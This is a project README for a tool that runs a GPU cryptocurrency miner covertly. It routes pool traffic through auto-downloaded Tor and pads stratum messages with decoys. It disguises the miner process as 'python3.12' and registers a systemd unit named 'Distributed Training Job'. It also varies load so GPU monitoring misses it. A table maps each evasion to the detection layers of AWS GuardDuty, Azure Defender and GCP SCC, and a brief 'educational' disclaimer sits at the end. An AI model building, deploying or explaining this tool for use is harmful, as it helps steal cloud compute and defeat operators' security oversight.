# Stealth OneZero

Tor-integrated stealth launcher for [OneZeroMiner](https://github.com/EhssanD/onezerominer) — lightweight, no root required, works on stripped Linux environments.

## Features

| Layer | What it does |
|---|---|
| **Tor bootstrap** | Auto-download Tor Expert Bundle, start SOCKS5, no system tor needed |
| **Stratum obfuscation** | Local proxy with random padding, delay, decoy messages |
| **Process disguise** | `comm name = python3.12` (looks like AI training in `ps`) |
| **Variable load** | Random mine/pause gaps or power cycling — avoids GPU anomaly detection |
| **systemd integration** | User unit named "Distributed Training Job" |
| **Graceful degrade** | Tor fail → direct; no pysocks → raw TCP; no nvidia-smi → time-only |

## Requirements

- Linux x86_64 (tested on Ubuntu 20.04+, Debian 11+, CentOS 8+)
- Python 3.6+ (or pure bash fallback)
- GPU with NVIDIA driver (for mining)
- Outbound HTTPS access (for Tor download)

**No root required.** No kernel modules. No system packages to install.

## Quick Start

```bash
# 1. Download & extract
git clone https://github.com/ducknogit/stealth_onezero.git
cd stealth_onezero

# 2. Make scripts executable
chmod +x *.sh *.py

# 3. Dry-run first
python3 stealth_full.py \
    --algo pearlhash \
    --wallet YOUR_WALLET_ADDRESS \
    --pool stratum+ssl://pool.example.com:4444 \
    --no-tor --dry-run -v

# 4. Run for real
python3 stealth_full.py \
    --algo pearlhash \
    --wallet YOUR_WALLET_ADDRESS \
    --pool stratum+ssl://pool.example.com:4444
```

## Usage

### Full stack (recommended)

```bash
python3 stealth_full.py \
    --algo pearlhash \
    --wallet WALLET \
    --pool stratum+ssl://pool.example.com:4444 \
    --worker rig01
```

### Skip Tor (direct connection)

```bash
python3 stealth_full.py \
    --algo pearlhash --wallet WALLET \
    --pool stratum+ssl://pool.example.com:4444 \
    --no-tor
```

### Skip load scheduler (continuous mining)

```bash
python3 stealth_full.py \
    --algo pearlhash --wallet WALLET \
    --pool stratum+ssl://pool.example.com:4444 \
    --no-scheduler
```

### Custom load pattern

```bash
# Mine 45-90 min, pause 3-10 min
python3 stealth_full.py \
    --algo pearlhash --wallet WALLET \
    --pool stratum+ssl://pool.example.com:4444 \
    --strategy random-gaps \
    --mine-min 45 --mine-max 90 \
    --pause-min 3 --pause-max 10

# Power cycling 250W/120W
python3 stealth_full.py \
    --algo pearlhash --wallet WALLET \
    --pool stratum+ssl://pool.example.com:4444 \
    --strategy power-cycle \
    --high-w 250 --low-w 120
```

### Standalone components

```bash
# Tor only
python3 stealth.py --no-tor --dry-run

# Stratum proxy only
python3 stratum_proxy.py \
    --listen 127.0.0.1:3333 \
    --pool stratum+ssl://pool.example.com:4444 \
    --socks 127.0.0.1:9050 \
    -v

# Load scheduler only
python3 load_scheduler.py -- \
    ./onezerominer --algo=pearlhash --pool=... --wallet=...

# Pure bash fallback (no Python needed)
bash stealth.sh --disguise-proc python3.12
```

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│  stealth_full.py (orchestrator)                         │
│                                                         │
│  ┌─────────────┐  ┌──────────────┐  ┌────────────────┐ │
│  │ Tor         │  │ Stratum      │  │ Load           │ │
│  │ Bootstrap   │  │ Proxy        │  │ Scheduler      │ │
│  │             │  │              │  │                │ │
│  │ SOCKS5      │  │ padding      │  │ random-gaps    │ │
│  │ 127.0.0.1   │  │ delay        │  │ power-cycle    │ │
│  │ :9050       │  │ decoy        │  │ sine           │ │
│  └──────┬──────┘  └──────┬───────┘  └───────┬────────┘ │
│         │                │                   │          │
│         └────────────────┼───────────────────┘          │
│                          │                              │
│                    ┌─────▼──────┐                       │
│                    │ Miner      │                       │
│                    │ comm=      │                       │
│                    │ python3.12 │                       │
│                    └────────────┘                       │
└─────────────────────────────────────────────────────────┘

Traffic flow:
  Miner → 127.0.0.1:3333 (proxy) → SOCKS5 → Tor → Pool
```

## Cloud anti-mining evasion

This tool addresses detection layers used by AWS GuardDuty, Azure Defender, GCP SCC:

| Detection | Evasion |
|---|---|
| Mining pool IP blocklist | Route via Tor (exit IP changes) |
| Stratum protocol pattern | JSON padding + decoy messages |
| GPU utilization anomaly | Variable load scheduler |
| Process name scanning | comm name = python3.12 |
| DNS query logging | SOCKS5 remote DNS (rdns=True) |
| Tor exit node blocklist | Tor bridges (manual config) |

## Configuration

Edit `stealth_full.py` defaults:

```python
DEFAULT_LISTEN = "127.0.0.1:3333"    # Stratum proxy
DEFAULT_SOCKS = "127.0.0.1:9050"     # Tor SOCKS5
DISGUISE_PROC = "python3.12"         # Process name disguise
```

Or pass via CLI (see `--help`).

## Troubleshooting

| Issue | Fix |
|---|---|
| `Tor timeout` | Check outbound HTTPS; try `--no-tor` |
| `pysocks not available` | `pip3 install pysocks` or run without `--socks` |
| `nvidia-smi not found` | Use `--no-gpu-ctrl` (time-only throttle) |
| `proxy exited code=2` | Check pool URL format: `stratum+ssl://host:port` |
| `miner not found` | Place `onezerominer` binary in `bin/` or `$PATH` |
| Encoding error (Windows) | Run on Linux; Windows console uses cp1252 |

## Dependencies

| Component | Required? | Install |
|---|---|---|
| Python 3.6+ | Yes (or use bash fallback) | System package |
| pysocks | Optional (for Tor) | `pip3 install pysocks` |
| nvidia-smi | Optional (for GPU control) | CUDA toolkit |
| tor | Auto-downloaded | None needed |

## Disclaimer

For educational and authorized use only. Ensure compliance with your cloud provider's Terms of Service and acceptable use policies.

## License

MIT
